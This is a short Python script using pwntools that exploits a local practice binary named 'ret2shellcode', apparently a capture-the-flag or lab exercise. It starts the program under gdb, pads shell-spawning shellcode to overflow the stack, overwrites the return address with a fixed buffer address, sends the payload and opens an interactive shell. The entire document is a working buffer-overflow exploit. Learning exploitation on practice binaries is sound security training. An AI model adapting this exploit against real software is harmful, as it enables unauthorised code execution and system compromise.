from pwn import *

#sh = process('./ret2shellcode')
sh = gdb.debug('./ret2shellcode', "break main")


buf2_addr = 0x804a080

padding_count = 0xffffccf8-0xffffcc70-0x1c

shellcode = asm(shellcraft.sh())

payload = shellcode.ljust(padding_count+4, b'A') + p32(buf2_addr)

sh.sendline(payload)
sh.interactive()
